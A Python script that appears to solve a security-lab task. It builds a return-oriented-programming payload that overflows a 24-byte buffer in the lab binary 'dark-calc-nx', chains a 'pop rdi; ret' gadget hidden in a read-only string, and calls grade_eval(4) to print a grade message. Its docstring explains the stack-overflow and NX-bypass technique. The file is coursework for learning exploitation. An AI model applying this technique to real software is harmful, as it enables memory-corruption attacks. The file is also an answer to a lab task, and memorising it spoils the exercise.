#!/usr/bin/env python3
"""Task 3: ROP payload for attack/dark-calc-nx.

dark-calc-nx has a non-executable, ASLR-randomised stack, so we cannot inject
shellcode. Instead we chain gadgets from the (non-PIE, fixed-address) code and
read-only segments to call grade_eval(4), which prints
"Hope A will be your grade!".

Overflow offset: same as dark-calc -- input()'s 16-byte expression buffer plus
the saved rbp puts the return address 24 bytes into the buffer.

Gadgets (the lab says they live in 0x4019d0..0x401ae3). The useful one is
hidden in the "answer" string in .rodata (which lies inside the R-E segment,
so it is executable):

    answer = "42_is_The_\xc3\x80nswer"     # \xc3\x80 is the UTF-8 of 'A' (U+00C0)
    bytes : ... 5f c3 80 ...               # 0x5f = 'pop rdi', 0xc3 = 'ret'
              ^   ^
        0x401a79 0x401a7a

    0x401a79: pop rdi; ret
    0x401a7a: ret          (used to realign the stack before printf)

Chain:
    pop rdi ; ret   ->  rdi = 4
    ret             ->  realign rsp (grade_eval calls printf, whose movaps
                         requires a 16-byte-aligned stack)
    grade_eval      ->  grade_eval(4) prints "Hope A will be your grade!"
"""
import struct
import sys

POP_RDI_RET = 0x401A79
RET         = 0x401A7A
GRADE_EVAL  = 0x401978

payload = b"A" * 24                         # expression (16) + saved rbp (8)
payload += struct.pack("<Q", POP_RDI_RET)   # return address -> pop rdi; ret
payload += struct.pack("<Q", 4)             # rdi = 4 (the "grade" argument)
payload += struct.pack("<Q", RET)           # alignment fix for printf
payload += struct.pack("<Q", GRADE_EVAL)    # grade_eval(4)

sys.stdout.buffer.write(payload + b"\n")
